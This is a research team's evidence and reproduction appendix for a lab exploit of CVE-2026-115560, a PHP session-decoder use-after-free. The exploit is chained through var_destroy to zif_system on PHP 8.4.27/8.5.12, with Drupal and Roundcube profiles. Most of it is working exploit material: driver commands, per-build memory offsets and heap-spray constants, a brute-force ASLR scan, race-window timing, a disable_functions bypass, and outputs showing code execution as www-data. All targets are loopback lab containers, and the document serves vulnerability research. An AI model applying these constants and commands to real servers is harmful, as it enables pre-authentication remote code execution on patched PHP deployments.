# Evidence, reproduction, and credits appendix — CVE-2026-115560 → `var_destroy` → `zif_system`

**Date:** 2026-10-31
**Status:** local draft. **No external send, no publish, no vendor contact.**
**Scope:** LAB-ONLY. Every target is `127.0.0.1` (a loopback container port).
The only command the forged terminal ever executes is the fixed benign

```sh
id>/tmp/vd 2>&1
```

There is no arbitrary-command interface in any driver. The `var_destroy`
carrier placement and constants remain unpublished outside this repo until a
separate send decision (`docs/PUBLICATION_DECISION_115560.md`).

**Evidence rule used throughout.** A claim is "verified" only where a command
ran and its output was recorded. Rows are marked:

- **[run]** — command + output quoted from the cited doc/log.
- **[file]** — artifact exists on disk in this tree (path given).
- **[recheck]** — re-executed while assembling this appendix (2026-10-31);
  command and output are quoted in §14.

**Document order:** gates (G0–G4) → frozen hashes/constants → calibration →
reproduction commands → file map → lab inventory → controls → ASAN → evidence
paths → limits → credits/prior art → wording → caveats → receipts.

---

## 1. Gate matrix G0–G4

Gate definitions come from the internal 115560 planning note
(G0–G4) and the summary in `docs/PHASE1_2_115560_RESULTS.md`. G3 is the
**breadth fallback** (“public 115560 simple-gadget baseline works”); it was not
executed because G1 and G2 both passed. Do not confuse it with `docs/PLAN.md`'s
unrelated 109619 version-matrix gate (`poc/verify_matrix.py`).

| Gate | Condition (as written) | Verdict | Proven in |
|---|---|---|---|
| **G0** | frozen baseline: positives + all listed controls negative | **PASS** | `docs/PHASE0_115560_FREEZE.md` |
| **G1** | Drupal 11.4.11 P5 UAF + terminal through 115560 | **PASS** on 8.4.27 and 8.5.12; `cleanup=On` race PASS on 8.4.27 | `docs/DRUPAL_115560.md`, `docs/DRUPAL_AUTOLOAD_PROBE.md` |
| **G2** | Roundcube plugin path + terminal | **PASS for the plugin-assisted profile**; stock db/redis blocker reproduced | `docs/ROUNDCUBE_115560.md` |
| **G3** | public 115560 simple-gadget baseline (breadth fallback) | **NOT RUN** — not needed after G1/G2; public B63/googlesky already provide it | `docs/GADGET_SURVEY_115560.md`, `docs/PLAN_115560.md` |
| **G4** | novelty + embargo decision | **Novelty resolved** (composition is public); **decision: document locally, no send** | `docs/NOVELTY_115560_2026-10-31.md`, `docs/PUBLICATION_DECISION_115560.md`, `PROGRESS.md` iteration 61 |

### 1.1 G0 — commands and observed output

Source: `docs/PHASE0_115560_FREEZE.md`. Five positives are listed in the freeze
table, while the Phase 1/2 summary calls G0 "four positives". The freeze table
is the authoritative artifact; the "four" is a summary slip, not a missing run.

| # | Command (frozen tree) | Observed |
|---|---|---|
| P1 | `python3 poc/verify_115560_vardestroy.py --target 127.0.0.1:18200 --container php2shell-115560-8427 --build 8.4.27 run` | `main=0xffff9e400000 lib=0xffffa0530000 zif=0xffffa0961510 delta=0x6c019` → `uid=33(www-data)` |
| P2 | `python3 poc/verify_115560_vardestroy.py --target 127.0.0.1:18201 --container php2shell-115560-8512 --build 8.5.12 run` | `main=0xffffa3c00000 lib=0xffffa0600000 zif=0xffffa0b35490 delta=0x6c019` → `uid=33(www-data)` |
| P3 | `python3 poc/verify_115560_vardestroy.py --target 127.0.0.1:18203 --container php2shell-115560-8427-nofunc --build 8.4.27 run` | `main=0xffff87a00000 zif=0xffff89fc1510 delta=0x6c019` → `uid=33(www-data)` |
| P4 | `python3 poc/verify_115560_race.py --target 127.0.0.1:18204 --container php2shell-115560-8427-race --build 8.4.27 --settle 0.7 --attempts 3 run` | `delta=0x6d875` → `uid=33`; dtor log `inv=1 skip-first` / `inv=2 spray-done ref=1020 fire-end` |
| P5 | `python3 poc/verify_115560_race.py --target 127.0.0.1:18205 --container php2shell-115560-8512-race --build 8.5.12 --settle 0.7 --attempts 3 run` | `delta=0x80875` → `uid=33`; same dtor shape |

### 1.2 G0 — controls (all negative)

| Control | Command / target | Observed |
|---|---|---|
| wrong `zif` (direct) | 8.4.27 `--bias-zif 0x1000 run` | measure OK, `proof=''` |
| no runtime handler switch | 8.4.27 `--path /noswitch.php run` | HTTP 200, no `meas_pid`, `proof=''` |
| upload-progress off | `127.0.0.1:18202` / `php2shell-115560-8427-noupload run` | no dtor, no `meas_pid` |
| race past window | 8.4.27 race `--settle 6.0 --attempts 1 --no-remeasure run` | only `inv=1 skip-first`; no real dtor, no proof |
| race no persistent first record | 8.4.27 race `--no-seed --measure-attempts 1 --no-remeasure run` | only `inv=1`; no real dtor, no proof |
| race wrong `zif` | 8.5.12 race `--bias-zif 0x1000 --attempts 1 --no-remeasure run` | real dtor reached, `proof=''` (clean control is `--no-remeasure`) |
| race other SID | upload SID `bd55…` → `/prime.php`; consumer SID `ea6f…` → `/index.php?m=5` | `dtor_log='after-session-start\nshutdown\n'`, no `meas_pid`, HTTP 200 |

### 1.3 G1 — Drupal 11.4.11 P5

Chain (stock Drupal core): `YamlCacheCollectorDiscovery::__destruct` →
`MenuActiveTrail::destruct` → `CacheCollector::updateCache` →
`MemoryBackend::get` → `prepareItem` → `unserialize($prepared->data)`.
Delivery is the real 115560 decoder (upload-progress record written under
`php_serialize`; app switches to `php`; `session_start()`), with no
application `unserialize()` sink in the request path.

**Direct, 8.4.27** `[run]` — `python3 poc/verify_115560_drupal.py --target 127.0.0.1:18300 --container php2shell-115560-drupal-8427 --build 8.4.27 run`:

```text
[m] measure payload_len=69819 cid_len=8102 nk=65 npad=4
[m] pid=2872 main=0xffff9ee00000 lib=0xffffa0fd0000 zif=0xffffa1401510
[m] magic=0xffff9ee7b82d carrier=0xffff9ee7b02d value_string=0xffff9ee7b019 delta=0x7b019
[f] response=<none> proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[EVIDENCE] 115560 session decode -> Drupal P5 -> var_destroy -> uid=33
```

**Direct, 8.5.12** `[run]` — same driver, `--target 127.0.0.1:18301 --container php2shell-115560-drupal-8512 --build 8.5.12 run`:

```text
[m] pid=77 main=0xffff82000000 lib=0xffff7ea00000 zif=0xffff7ef35490
[m] delta=0x7b019
[f] proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
```

**Autoload fidelity** `[run]` — no harness preload
(`lab-drupal/vd_nopreload.php` removes the `class_exists()` loop):

```sh
python3 poc/verify_115560_drupal.py --target 127.0.0.1:18300 \
  --container php2shell-115560-drupal-8427 --build 8.4.27 \
  --main 0xffff9ee00000 --delta 0x7b019 --zif 0xffffa1401510 \
  --path /vd_nopreload.php fire
```

```text
[f] payload_len=69819 cid_len=8102 nk=65 npad=4
    carrier=0xffff9ee7b02d zval_ptr=0xffff9ee7b12d zif=0xffffa1401510
[f] response=<none> proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[EVIDENCE] 115560 session decode -> Drupal P5 -> var_destroy -> uid=33
```

**Drupal controls** `[run]`:

| Control | Command | Observed |
|---|---|---|
| no 8160 spray | `--cid-len 100 run` | payload 45810; `HTTP/1.1 200 OK`; proof empty; no terminal |
| wrong `zif` | `--bias-zif 0x1000 run` | `zif=0xffffa1402510`; proof empty; no terminal |

Both keep `nk=65,npad=4`, so the negative is caused by the removed spray /
wrong function pointer, not by a different heap.

**Drupal `cleanup=On` race, 8.4.27 (:18302)** `[run]`:

```sh
python3 poc/verify_115560_drupal.py \
  --target 127.0.0.1:18302 \
  --container php2shell-115560-drupal-8427-race \
  --build 8.4.27 --settle 0.7 --nchunks 8 --delay 0.6 race
```

```text
[*] race settle=0.7s chunks=8x64KiB delay=0.6s window~4.8s seed=True
[m] race pid=970 main=0xffff9d000000 lib=0xffff9f040000 zif=0xffff9f471510
[m] race carrier=0xffff9d07b889 value_string=0xffff9d07b875 delta=0x7b875
[f] race proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'
[EVIDENCE] cleanup=On race -> Drupal P5 -> var_destroy -> uid=33
```

Race controls `[run]`: `--settle 6.0` → hold pid exists but no raw-input magic,
`rc=2`, no proof; `--no-seed` → measure finds payload (`delta=0x79037`), fire
returns `HTTP/1.1 200 OK`, no proof; `--bias-zif 0x1000` → measure succeeds,
fire consumer dies without writing `/tmp/vd`.

**Caveat:** G1 needs the non-default
`session.storage.options.serialize_handler: php` line. It is a config-gated
profile, not default Drupal. The `cleanup=On` race was proven on 8.4.27 only.

### 1.4 G2 — Roundcube 1.6.11 (plugin-assisted)

**Load order** `[run]` — plugin top-level code executes in `rcmail::startup()`
before `session_init()`, and the simple destructor fires during the decode:

```text
1793404264.188396 pid=29 plugin-load handler=php_serialize name=PHPSESSID
1793404264.188448 pid=29 handler-switched handler=php
1793404264.188881 pid=29 simple-dtor          <- during session_start decode
1793404264.191581 pid=29 plugin-init task=.*  <- after session_init
proof: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Write path** `[file]` — `lab-roundcube/evidence/prime-8427.log`:

```text
[p] sess_rcprime8427abc:
b'a:1:{s:10294:"upload_progress_|a:1018:{i:0;s:4096:"\x00...'
```

**Simple gadget** `[run]` — `VdSimple::__destruct` → `exec('id>/tmp/vd 2>&1')`:
`uid=33` on 8.4.27 (`:18310`) and 8.5.12 (`:18311`).

**Terminal** `[run]` — plugin `CachePurge` dtor sprays and re-enters `R:1020;`:

| build | main | lib | zif | delta | spray | proof |
|---|---|---|---|---|---|---|
| 8.4.27 | `0xffffab600000` | `0xffffad780000` | `0xffffadbb1510` | `0x8d9c1` | `3048` | `uid=33` |
| 8.5.12 | `0xffff81c00000` | `0xffff7e600000` | `0xffff7eb35490` | `0x9e9c1` | `8135` | `uid=33` |

**Roundcube controls** `[run]` (both builds, captured addresses):
`--bias-zif 0x1000` → `response=<none>`, no proof; `--noswitch` → HTTP 200, no
proof; `--nogadget` → HTTP 200, no proof.

**Stock blocker** `[run]` — with SQLite `session_storage='db'` the DB row held
only `temp|b:1;language|s:5:"en_US";task|s:5:"login";skin_config|a...` and no
`upload_progress` bytes; no dtor, no `/tmp/vd`. The upload-progress hook writes
the file store before the app installs its own save handler.

### 1.5 G4 — novelty and decision

`[run]` (read-only public-record check, `docs/NOVELTY_115560_2026-10-31.md`):

- The four-stage composition is published by `ACD421/PHP`
  `weapons/lab/fa_jammy.sh` (2026-10-26) and the stock `cleanup=1` slow-upload
  race by `zero1` (2026-10-21).
- Therefore the internal sentence "nobody published the composition where the
  session decoder itself is the var_destroy sink" is **retracted**.
- No new CVE is claimed. CVE-2026-115560 is assigned; the `var_destroy` UAF has
  been public since 2026-05-01/02.

Decision recorded in `docs/PUBLICATION_DECISION_115560.md` and `PROGRESS.md`
iteration 61: **document everything locally in Markdown; no external send, no
publish, no vendor contact.**

Defensible narrow delta (use this framing):

1. patched **8.4.27 / 8.5.12** pre-auth end-to-end;
2. **default `cleanup=On` race + `var_destroy` terminal**, including the
   two-record seed;
3. **arm64 no-`/proc`** measured full-window result;
4. measured raw-session carrier and per-build constants;
5. real-app profiles (Drupal config-gated, Roundcube plugin-assisted).

Not claimed: default PHP, "first", a new composition, a new CVE, a new
`disable_functions` bypass, a new multi-worker/pinning technique.

---

## 2. Frozen hashes and constants

`[recheck]` The four frozen hashes from `docs/PHASE0_115560_FREEZE.md` still
match the working tree (command in §14.1). This is the static half of the
freeze: it proves the appended results were produced by the drivers this repo
still contains.

| Item | Value | Status |
|---|---|---|
| git HEAD | `ed1181edc1ec0d57166e815c3f53bab92b0d95ee` | matches `[recheck]` |
| `poc/verify_115560_vardestroy.py` | `692d328072435235057b2daca0d60a467a0d3edd1c4b4c4e73f221f3ee3f91c2` | match |
| `poc/verify_115560_race.py` | `4e8164627310eb025ce816c6d16b5298de227da5e1c5eda3880889a4d2c82aa3` | match |
| `lab-115560/webroot/index.php` | `c7ad767e19ab176d24d1b24b3bceda17b3b7b7bf4b544a4e743311146c6c3258` | match |
| `lab-115560/php-115560.ini` | `997f9bd386bc3d5cd05b097cec42496b077bfa937743e06c9d3fd807b120c6bd` | match |
| Python | `3.14.7` | matches freeze |
| Docker | `29.8.2` | matches freeze |
| ASAN log `asan_session.log` | `cc8021a5e8875a1761f42526ee7a48898a4a61761a4d9ea86c0059b486a1376c` | `[recheck]` |

These two drivers post-date the freeze and therefore have no frozen hash; their
current hashes are recorded so a later change is detectable:

| Item | SHA-256 (as of this appendix) |
|---|---|
| `poc/verify_115560_drupal.py` | `75f0e6575a4f7f4cb68172d772684904ec35560a307a96030925abd7a4595ad3` |
| `poc/verify_115560_roundcube.py` | `d9e0a1175f9e88c20d20f8d9f75950ca0c3be09d1ddb01e35cf6778ebb05f1ef` |

### 2.1 Frozen calibration constants (direct request shape)

| build | delta (direct) | delta (race) | `lib − main` | `zif_system` sym offset | spray |
|---|---|---|---|---|---|
| 8.4.27 | `0x6c019` | `0x6d875` | `+0x2130000` | `0x431510` | `3048` |
| 8.5.12 | `0x6c019` | `0x80875` | `-0x3600000` | `0x535490` | `8135` |

Reference id `1020`; fresh SID per request/attempt; `save_path=/tmp/sessions`.

**The freeze is explicit that these constants are per request shape.** A
different app or consumer page must re-measure `delta`, and `libphp` /
`zif_system` must be resolved for that container. Only the payload/carrier
geometry is frozen (see §13).

---

## 3. Calibration per build, mode, and architecture

All addresses are from the cited docs/logs; `†` marks a value derived by
subtraction from the same row (`lib − main`), not printed by the driver.

### 3.1 Core 115560 lab (`lab-115560`)

| build | mode | main | lib | lib−main | zif | delta | spray |
|---|---|---|---|---|---|---|---|
| 8.4.27 | direct | `0xffff9e400000` | `0xffffa0530000` | `+0x2130000` | `0xffffa0961510` | `0x6c019` | 3048 |
| 8.5.12 | direct | `0xffffa3c00000` | `0xffffa0600000` | `-0x3600000` | `0xffffa0b35490` | `0x6c019` | 8135 |
| 8.4.27 | race (warm) | `0xffff90200000` | `0xffff922b0000` | `+0x20b0000†` | `0xffff926e1510` | `0x6d875` | 3048 |
| 8.5.12 | race (warm) | `0xffffb4c00000` | `0xffffb1600000` | `-0x3600000` | `0xffffb1b35490` | `0x80875` | 8135 |
| 8.4.27 | `disable_functions` | `0xffff87a00000` | `0xffff89b90000` | `+0x2190000†` | `0xffff89fc1510` | `0x6c019` | 3048 |
| 8.4.27 | 8 workers (arm64) | `0xffffaf000000` | `0xffffb10f0000` | `+0x20f0000` | `0xffffb1521510` | `0x6c019` | 3048 |
| 8.4.27 | amd64/Rosetta | `0x7ffffc400000` | `0x7ffffe007000` | `+0x1c07000` | `0x7ffffe471d70` | `0x6c019` | 3048 |

amd64 `zif_system` symbol offset is `0x46ad70` (not `0x431510`). The amd64 run
is userspace under **Rosetta 2 for Linux**, not a native x86-64 kernel
(`/proc/<pid>/maps` contains `/mnt/rv/[rosetta]`).

### 3.2 Real-app profiles

| app | build | mode | main | lib | zif | delta | spray |
|---|---|---|---|---|---|---|---|
| Drupal 11.4.11 | 8.4.27 | direct | `0xffff9ee00000` | `0xffffa0fd0000` | `0xffffa1401510` | `0x7b019` | 3048 |
| Drupal 11.4.11 | 8.5.12 | direct | `0xffff82000000` | `0xffff7ea00000` | `0xffff7ef35490` | `0x7b019` | 8135 |
| Drupal 11.4.11 | 8.4.27 | race | `0xffff9d000000` | `0xffff9f040000` | `0xffff9f471510` | `0x7b875` | 3048 |
| Roundcube 1.6.11 | 8.4.27 | direct | `0xffffab600000` | `0xffffad780000` | `0xffffadbb1510` | `0x8d9c1` | 3048 |
| Roundcube 1.6.11 | 8.5.12 | direct | `0xffff81c00000` | `0xffff7e600000` | `0xffff7eb35490` | `0x9e9c1` | 8135 |

The Roundcube `delta` is the **highest-address session-buffer candidate**, not
the request-body buffer at `0x6c019`. On 8.4.27 the scanned candidates were
`0x799c1`, `0x80029`, `0x8d9c1`; on 8.5.12 they were `0x799c1`, `0x80029`,
`0x859c1`, `0x9e9c1`.

### 3.3 Heap-shaping parameters (Drupal)

`payload_len=69819`, `cid_len=8102`, `nk=65` string-keyed
`keysToPersist`/`storage` entries, `npad=4` late 8160-byte strings,
`var_entries` = `16 + 8*1018 = 8160` bytes. Integer keys do not work: they
produce a packed array whose storage is never a two-page hashtable (`nk<=64`
misses). Both controls keep `nk=65,npad=4`.

---

## 4. Exact reproduction commands

All commands assume `cwd =` this repository's root. Every
target is loopback. The proof file is always `/tmp/vd` and always contains
`id` output only.

### 4.1 Bring-up

```sh
cd lab-115560 && docker compose up -d && cd ..
cd lab-115560 && docker compose -p php2shell-115560-race -f docker-compose.race.yml up -d && cd ..
docker compose -f lab-115560/docker-compose.nofunc.yml up -d
docker compose -f lab-115560/docker-compose.workers.yml up -d
cd lab-drupal/vdlab && docker compose up -d && cd ../..
cd lab-roundcube && docker compose up -d && cd ..
```

The race/worker/no-func/amd64 services need `SYS_PTRACE` +
`seccomp=unconfined` only for the `/proc` measurement step; fire is plain HTTP.

### 4.2 Direct 115560 (8.4.27 / 8.5.12)

```sh
python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18200 --container php2shell-115560-8427 \
  --build 8.4.27 run

python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18201 --container php2shell-115560-8512 \
  --build 8.5.12 run
```

Expected: `[EVIDENCE] 115560 session decode -> var_destroy -> uid=33` and
`uid=33(www-data) …` in `/tmp/vd`.

### 4.3 No-`/proc` final (arm64 18-bit main window)

```sh
# 8.4.27: lib = main + 0x2130000, zif offset 0x431510
python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18200 --container php2shell-115560-8427 --build 8.4.27 \
  --brute --delta 0x6c019 --lib-delta 0x2130000 --zif-off 0x431510 --fire-mode 4

# 8.5.12: lib = main - 0x3600000, zif offset 0x535490
python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18201 --container php2shell-115560-8512 --build 8.5.12 \
  --brute --delta 0x6c019 --lib-delta=-0x3600000 --zif-off 0x535490 --fire-mode 4
```

Scans `0xFFFF78000000..0xFFFFC0000000` in `0x200000` steps (576 candidates),
fresh SID + `/prime.php` dummy per attempt, no `/proc`, no measurement, no
debugger. Measured results: 8.5.12 found at attempt 351 (1406 s), 8.4.27 at
attempt 307 (1238.8 s).

### 4.4 `cleanup=On` streaming race

```sh
python3 poc/verify_115560_race.py \
  --target 127.0.0.1:18204 --container php2shell-115560-8427-race \
  --build 8.4.27 --settle 0.7 --attempts 3 run

python3 poc/verify_115560_race.py \
  --target 127.0.0.1:18205 --container php2shell-115560-8512-race \
  --build 8.5.12 --settle 0.7 --attempts 3 run
```

Shape: 8 × 64 KiB chunks, 0.6 s apart (~4.8 s window), `settle=0.7 s`,
`Connection: close`; the streaming upload holds one prefork child while the
consumer GET runs in another. `/seed.php?d=1` supplies the persistent first
record (`seed_d = "|" + valid a:1018`); `/prime.php`'s record is erased by
`cleanup=On`, so it must not be used as the first record.

Race controls:

```sh
# past the window
python3 poc/verify_115560_race.py --target 127.0.0.1:18204 \
  --container php2shell-115560-8427-race --build 8.4.27 \
  --settle 6.0 --attempts 1 --no-remeasure run

# single record
python3 poc/verify_115560_race.py --target 127.0.0.1:18204 \
  --container php2shell-115560-8427-race --build 8.4.27 \
  --no-seed --measure-attempts 1 --no-remeasure run
```

### 4.5 `disable_functions`-hardened target

```sh
docker exec php2shell-115560-8427-nofunc php -r \
  'var_dump(function_exists("system")); var_dump(function_exists("shell_exec"));
   echo "disable_functions=", ini_get("disable_functions"), "\n";'
# bool(false) / bool(false) / system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec

python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18203 \
  --container php2shell-115560-8427-nofunc \
  --build 8.4.27 run

# control: same addresses, biased zif
docker exec php2shell-115560-8427-nofunc rm -f /tmp/vd
python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18203 \
  --container php2shell-115560-8427-nofunc --build 8.4.27 \
  --main 0xffff87a00000 --delta 0x6c019 --zif 0xffff89fc1510 \
  --bias-zif 0x1000 fire
```

Observed positive: `proof='uid=33(www-data) …'`, `run_exit=0`. Observed
control: `proof=''`, `control_exit=1`. A throwaway mod_php probe also showed
`function_exists(system)=false` and
`system_call=blocked: Error: Call to undefined function system()`, ruling out a
CLI-only ini.

### 4.6 Multi-worker and pinning

```sh
python3 poc/verify_115560_vardestroy.py \
  --target 127.0.0.1:18206 \
  --container php2shell-115560-8427-workers --build 8.4.27 run

python3 poc/verify_worker_pinning.py --target http://127.0.0.1:18206 --holders 7

python3 lab-115560/fire_pinned.py --target 127.0.0.1:18206 \
  --container php2shell-115560-8427-workers --build 8.4.27 \
  --mode pinned --holders 7
```

Observed: unpinned measure pid 20 / fire pid 22, `uid=33`; pinning control
`8 distinct PIDs across 16 responses`, pinned `1 distinct PID across 12
responses`; chain inside the pinned window `measure pid 24` → `fire pid 135`,
`uid=33`. All children share `main=0xffffaf000000`, `lib=0xffffb10f0000`,
`zif=0xffffb1521510`, `delta=0x6c019`.

### 4.7 amd64 / Rosetta

```sh
docker rm -f php2shell-115560-amd64 2>/dev/null
docker run --platform linux/amd64 -d --name php2shell-115560-amd64 \
  -p 18207:80 \
  -v "$PWD/lab-115560/webroot:/var/www/html:ro" \
  -v "$PWD/lab-115560/php-115560.ini:/usr/local/etc/php/conf.d/zz-115560.ini:ro" \
  -v "$PWD/lab-115560/apache-single.conf:/etc/apache2/conf-enabled/zz-lab.conf:ro" \
  --cap-add SYS_PTRACE --security-opt seccomp=unconfined \
  php:8.4.27-apache \
  bash -c "mkdir -p /tmp/sessions && chmod 1777 /tmp/sessions && apache2-foreground"

python3 lab-115560/measure_amd64.py --target 127.0.0.1:18207 \
  --container php2shell-115560-amd64 --build 8.4.27

python3 poc/verify_115560_vardestroy.py --target 127.0.0.1:18207 \
  --container php2shell-115560-amd64 --build 8.4.27 \
  --main 0x7ffffc400000 --delta 0x6c019 \
  --lib 0x7ffffe007000 --zif 0x7ffffe471d70 fire
```

The stock driver's `maps.parse_maps` fails on amd64 (libphp offset-0 mapping is
`r--p`; the 2 MiB main chunk starts one page before the boundary). The probe
corrects this; no driver edit was made. Control `--bias-zif 0x1000` with the
same addresses writes no proof.

### 4.8 Drupal direct / race / autoload probe

See §1.3; commands are repeated verbatim there. Summary:

```sh
python3 poc/verify_115560_drupal.py --target 127.0.0.1:18300 \
  --container php2shell-115560-drupal-8427 --build 8.4.27 run
python3 poc/verify_115560_drupal.py --target 127.0.0.1:18301 \
  --container php2shell-115560-drupal-8512 --build 8.5.12 run
python3 poc/verify_115560_drupal.py --target 127.0.0.1:18302 \
  --container php2shell-115560-drupal-8427-race --build 8.4.27 \
  --settle 0.7 --nchunks 8 --delay 0.6 race
python3 poc/verify_115560_drupal.py --target 127.0.0.1:18300 \
  --container php2shell-115560-drupal-8427 --build 8.4.27 \
  --main 0xffff9ee00000 --delta 0x7b019 --zif 0xffffa1401510 \
  --path /vd_nopreload.php fire
```

Defaults are `--nk 65 --npad 4`; `len` prints payload length without touching
the target.

### 4.9 Roundcube simple / terminal / controls

```sh
python3 poc/verify_115560_roundcube.py \
  --target 127.0.0.1:18310 --container php2shell-rc-8427 --build 8.4.27 simple
python3 poc/verify_115560_roundcube.py \
  --target 127.0.0.1:18311 --container php2shell-rc-8512 --build 8.5.12 simple

python3 poc/verify_115560_roundcube.py \
  --target 127.0.0.1:18310 --container php2shell-rc-8427 --build 8.4.27 run
python3 poc/verify_115560_roundcube.py \
  --target 127.0.0.1:18311 --container php2shell-rc-8512 --build 8.5.12 run

# controls on captured addresses
python3 poc/verify_115560_roundcube.py --target 127.0.0.1:18310 \
  --container php2shell-rc-8427 --build 8.4.27 \
  --main 0xffffab600000 --delta 0x8d9c1 --zif 0xffffadbb1510 \
  --bias-zif 0x1000 fire
python3 poc/verify_115560_roundcube.py --target 127.0.0.1:18310 \
  --container php2shell-rc-8427 --build 8.4.27 \
  --main 0xffffab600000 --delta 0x8d9c1 --zif 0xffffadbb1510 --noswitch fire
python3 poc/verify_115560_roundcube.py --target 127.0.0.1:18310 \
  --container php2shell-rc-8427 --build 8.4.27 \
  --main 0xffffab600000 --delta 0x8d9c1 --zif 0xffffadbb1510 --nogadget fire

# session-write evidence
python3 poc/verify_115560_roundcube.py --target 127.0.0.1:18310 \
  --container php2shell-rc-8427 --build 8.4.27 --sid rcprime8427abc prime
```

Measure and fire must use **different SIDs**: the measured delta describes a
two-record file (prime dummy + one payload). Reusing the measure SID adds a
third progress key and moves the carrier (observed: HTTP 200, no proof).

---

## 5. File map — labs, drivers, harness pages

### 5.1 Drivers (`poc/`, Python 3 stdlib only)

| File | Role |
|---|---|
| `poc/verify_115560_vardestroy.py` | direct `measure` / `fire` / `run`, `--brute` no-`/proc` window scan, bias control, `--path` control |
| `poc/verify_115560_race.py` | streaming upload + concurrent consumer GET; `--settle`, `--nchunks`, `--delay`, `--no-seed`, `--no-remeasure` |
| `poc/verify_115560_wakeup.py` | B′ payload builder (`__wakeup` / `__unserialize`, `nondup` / `dup` placement) |
| `poc/verify_115560_drupal.py` | Drupal P5 graph, heap shaping (`--cid-len`, `--nk`, `--npad`), `run` / `race` / `len`, autoload-probe `--path` |
| `poc/verify_115560_roundcube.py` | Roundcube `simple` / `prime` / `measure` / `fire` / `run`, `--noswitch`, `--nogadget` |
| `poc/verify_vardestroy_postcarrier.py` | shared payload builder imported by the Drupal/Roundcube drivers (not edited by them) |
| `poc/verify_worker_pinning.py` | holder-based Apache worker pinning primitive |

### 5.2 `lab-115560/` (core chain)

| Path | Role |
|---|---|
| `docker-compose.yml` | `:18200` 8.4.27, `:18201` 8.5.12, `:18202` 8.4.27 upload-progress off |
| `docker-compose.race.yml` | `:18204` / `:18205` `cleanup=On`; `:18208` / `:18209` `cleanup=Off` diagnostics |
| `docker-compose.nofunc.yml` | `:18203` `disable_functions` hardened |
| `docker-compose.workers.yml` | `:18206` 8-child prefork pool |
| `php-115560.ini` | `php_serialize`, upload-progress On, `cleanup=Off`, `/tmp/sessions` |
| `php-115560-race.ini` | same + `cleanup=On` |
| `php-115560-nofunc.ini` | same + `disable_functions=system,exec,shell_exec,passthru,popen,proc_open,pcntl_exec` |
| `php-115560-noupload.ini` | negative control |
| `apache-single.conf` | 1 prefork child, `MaxConnectionsPerChild=1` |
| `apache-race.conf` | `StartServers 4`, `MaxRequestWorkers 8`, `MaxConnectionsPerChild 1` |
| `workers.conf` | 8 persistent children, `MaxConnectionsPerChild 0` |
| `webroot/index.php` | consumer: defines `CachePurge`, switches handler, `m=0/1/2/4/5` |
| `webroot/prime.php` | writes one dummy progress record without `session_start()` |
| `webroot/seed.php` | persistent first record for `cleanup=On` (`?d=1`) |
| `webroot/noswitch.php` | control: no runtime handler switch |
| `webroot/wakeup.php` | `CacheWakeup` / `CacheWakeupU` consumer (`m=4/5`) |
| `webroot/decoy.php` | dtor-count/backtrace diagnostic twin |
| `webroot/scan_prefix.php`, `scan_value.php`, `vd_scan.php` | magic-hit / raw-input prefix scanners |
| `webroot/worker_id.php` | `pid=getmypid()` oracle for pinning |
| `fire_pinned.py`, `measure_amd64.py` | pinning wrapper; x86-64-aware measure probe |

`index.php` modes: `m=0` first dtor pid+sleep; `m=2` fire-shaped spray then
sleep; `m=4` skip the dry mid-parse dtor and fire on the real `var_destroy`
dtor; `m=5` skip the dry dtor and hold at the real one (measure); `m=1` fire on
every dtor (diagnostic). `?r=` reference id (default 1020); `?s=` spray length
(driver uses 3048 on 8.4.x, 8135 on 8.5.x).

### 5.3 `lab-drupal/` (G1)

| Path | Role |
|---|---|
| `vd.php` | HTTP consumer; preloads the six P5 classes with `class_exists()`, then `ini_set('php')` + `session_start()` |
| `vd_nopreload.php` | autoload-fidelity probe: same minus the `class_exists()` loop |
| `vd_prime.php` | dummy progress record (no `session_start()`) |
| `vd_seed.php` | persistent first record `seed_d = "|" + valid a:1018` for `cleanup=On` |
| `vd_scan_prefix.php`, `vd_peek.php`, `vd_session_cli.php` | scanners; CLI session-decoder harness used for ASAN |
| `vdlab/docker-compose.yml` | `:18300` 8.4.27, `:18301` 8.5.12, `:18302` 8.4.27 race |
| `vdlab/php-vd.ini`, `php-vd-race.ini` | `php_serialize`, upload-progress On, `cleanup=Off` / `On` |
| `vdlab/apache-single.conf`, `apache-race.conf` | single-child / 4-8 child prefork |

### 5.4 `lab-roundcube/` (G2)

| Path | Role |
|---|---|
| `docker-compose.yml` | `:18310` 8.4.27, `:18311` 8.5.12 |
| `php-roundcube.ini`, `php-roundcube-8512.ini` | `php_serialize`, upload-progress On, `cleanup=Off`; 8.5 adds the `array_first` compat shim |
| `apache-single.conf` | one prefork child |
| `prime.php` | upload-progress writer without `session_start()` |
| `scan_prefix.php` | raw session-buffer candidate finder |
| `roundcubemail-1.6.11/config/config.inc.php` | `session_storage='php'`, SQLite DSN for `INIT_WITH_DB` |
| `roundcubemail-1.6.11/plugins/vd115560/vd115560.php` | lab plugin: handler switch, `VdSimple`, `CachePurge` |
| `evidence/8427.log`, `8512.log`, `prime-8427.log` | captured runs (simple, terminal, controls, prime) |

### 5.5 Docs

`docs/PHASE0_115560_FREEZE.md`, `PHASE1_2_115560_RESULTS.md`,
`DRUPAL_115560.md`, `DRUPAL_AUTOLOAD_PROBE.md`, `ROUNDCUBE_115560.md`,
`NOVELTY_115560_2026-10-31.md`, `DEFENSE_115560.md`,
`GADGET_SURVEY_115560.md`, `RACE_WAKEUP_115560.md`, `NOFUNC_115560.md`,
`WORKERS_115560.md`, `X86_64_115560.md`, `VAR_DESTROY_UAF.md`,
`PLAN_115560.md`, `PUBLICATION_DECISION_115560.md`, `STATUS.md` §2.1.

### 5.6 Static gadget tooling and its ceiling

Two generators exist, and they answer different questions:

| Tool | Output | Ceiling |
|---|---|---|
| `scripts/gadget_sweep.sh` (ctags + ast-grep + Semgrep) | `reports/gadgets/<app>.{json,md}` | **same-class/same-method only**; cannot prove cross-class chains such as Drupal P5 |
